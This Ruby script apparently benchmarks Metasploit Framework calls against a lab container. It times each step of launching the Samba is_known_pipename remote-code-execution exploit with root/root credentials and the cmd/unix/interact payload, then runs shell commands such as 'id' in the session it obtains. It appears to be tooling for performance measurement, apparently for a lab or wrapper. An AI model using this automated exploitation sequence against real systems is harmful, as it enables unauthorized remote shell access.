#!/usr/bin/env ruby
# frozen_string_literal: true

#
# Time each MSF internal call directly in Ruby.
# This gives us ground truth without any Python/Rust overhead.
#

require 'benchmark'

def timed(name)
  result = nil
  time = Benchmark.realtime { result = yield }
  puts "  #{name}: #{(time * 1000).round(2)}ms"
  result
end

puts "=" * 60
puts "MSF INTERNAL TIMING (Pure Ruby)"
puts "=" * 60

TARGET = "172.19.0.3"

# ============================================================
# PHASE 1: Framework Initialization
# ============================================================
puts "\n" + "=" * 60
puts "PHASE 1: FRAMEWORK INITIALIZATION"
puts "=" * 60

timed("require 'msfenv'") do
  require 'msfenv'
end

timed("require 'msf/base'") do
  require 'msf/base'
end

framework = nil
timed("Msf::Simple::Framework.create") do
  framework = Msf::Simple::Framework.create
end

puts "  Framework version: #{framework.version}"

# ============================================================
# PHASE 2: Module Creation
# ============================================================
puts "\n" + "=" * 60
puts "PHASE 2: MODULE CREATION"
puts "=" * 60

exploit = nil
timed("framework.exploits.create('linux/samba/is_known_pipename')") do
  exploit = framework.exploits.create('linux/samba/is_known_pipename')
end

puts "  Module: #{exploit.fullname}"

# ============================================================
# PHASE 3: Option Setting
# ============================================================
puts "\n" + "=" * 60
puts "PHASE 3: OPTION SETTING"
puts "=" * 60

timed("datastore['RHOSTS'] = TARGET") do
  exploit.datastore['RHOSTS'] = TARGET
end

timed("datastore['SMB_SHARE_NAME'] = 'myshare'") do
  exploit.datastore['SMB_SHARE_NAME'] = 'myshare'
end

timed("datastore['SMB_USER'] = 'root'") do
  exploit.datastore['SMB_USER'] = 'root'
end

timed("datastore['SMB_PASS'] = 'root'") do
  exploit.datastore['SMB_PASS'] = 'root'
end

# ============================================================
# PHASE 4: Validation
# ============================================================
puts "\n" + "=" * 60
puts "PHASE 4: VALIDATION"
puts "=" * 60

timed("exploit.validate") do
  exploit.validate
end

missing = nil
timed("exploit.options.validate(exploit.datastore)") do
  missing = exploit.options.validate(exploit.datastore)
end
puts "  Missing options: #{missing.inspect}"

# ============================================================
# PHASE 5: Payload Setup
# ============================================================
puts "\n" + "=" * 60
puts "PHASE 5: PAYLOAD SETUP"
puts "=" * 60

payloads = nil
timed("exploit.compatible_payloads") do
  payloads = exploit.compatible_payloads
end
puts "  Compatible payloads: #{payloads.length}"
puts "  First few: #{payloads.take(3).map { |p| p[0] }.inspect}" if payloads.length > 0

# Set payload in datastore
timed("datastore['PAYLOAD'] = 'cmd/unix/interact'") do
  exploit.datastore['PAYLOAD'] = 'cmd/unix/interact'
end

# ============================================================
# PHASE 6: Exploit Execution
# ============================================================
puts "\n" + "=" * 60
puts "PHASE 6: EXPLOIT EXECUTION"
puts "=" * 60

# Clean existing sessions
framework.sessions.each_key do |sid|
  framework.sessions[sid].kill rescue nil
end
sleep 0.5

initial_session_count = framework.sessions.length
puts "  Initial sessions: #{initial_session_count}"

session = nil

# Run exploit and capture session
puts "\n  --- Running exploit (blocking) ---"
timed("exploit.exploit_simple (total)") do
  begin
    session = exploit.exploit_simple(
      'Payload' => 'cmd/unix/interact',
      'Target' => 0,
      'RunAsJob' => false,
      'LocalInput' => Rex::Ui::Text::Input::Buffer.new,
      'LocalOutput' => Rex::Ui::Text::Output::Buffer.new
    )
  rescue => e
    puts "    Error: #{e.class}: #{e.message}"
    puts "    #{e.backtrace.first(3).join("\n    ")}"
  end
end

# Check for session
if session
  puts "  Got session directly: #{session.sid}"
else
  # Check if session was registered in framework
  new_sessions = framework.sessions.keys - []
  if new_sessions.length > 0
    session = framework.sessions[new_sessions.first]
    puts "  Found session in framework: #{session.sid}"
  else
    puts "  No session returned, polling..."

    poll_start = Time.now
    while Time.now - poll_start < 30
      if framework.sessions.length > initial_session_count
        session = framework.sessions.values.last
        break
      end
      sleep 0.1
    end
    poll_time = Time.now - poll_start
    puts "  Poll time: #{(poll_time * 1000).round(2)}ms"
  end
end

unless session
  puts "\n  FAILED: No session created"
  puts "  Trying to debug..."
  puts "  Sessions: #{framework.sessions.keys.inspect}"
  puts "  Jobs: #{framework.jobs.keys.inspect}"
  exit 1
end

puts "\n  SUCCESS: Session #{session.sid}"
puts "  Type: #{session.type}"

# ============================================================
# PHASE 7: Shell Commands
# ============================================================
puts "\n" + "=" * 60
puts "PHASE 7: SHELL COMMANDS"
puts "=" * 60

puts "\n--- shell_command with different timeouts ---"

[5, 2, 1, 0.5, 0.2, 0.1].each do |timeout|
  output = nil
  timed("shell_command('id', #{timeout})") do
    output = session.shell_command('id', timeout)
  end
  puts "    Output: #{output.strip.inspect[0..40]}..." if output && !output.empty?
end

# ============================================================
# PHASE 8: Low-level shell operations
# ============================================================
puts "\n" + "=" * 60
puts "PHASE 8: LOW-LEVEL SHELL OPS"
puts "=" * 60

timed("shell_write('echo hello\\n')") do
  session.shell_write("echo hello\n")
end

sleep 0.05

timed("shell_read(-1, 0.1)") do
  output = session.shell_read(-1, 0.1)
  puts "    Read: #{output.inspect[0..40]}..." if output
end

# ============================================================
# PHASE 9: Session internals
# ============================================================
puts "\n" + "=" * 60
puts "PHASE 9: SESSION INTERNALS"
puts "=" * 60

timed("session.alive?") do
  puts "    Alive: #{session.alive?}"
end

timed("session.platform") do
  puts "    Platform: #{session.platform}" rescue puts "    Platform: N/A"
end

timed("session.arch") do
  puts "    Arch: #{session.arch}" rescue puts "    Arch: N/A"
end

# ============================================================
# CLEANUP
# ============================================================
puts "\n" + "=" * 60
puts "CLEANUP"
puts "=" * 60

timed("session.kill") do
  session.kill rescue nil
end

puts "\nDone! All timings above are actual measured values."
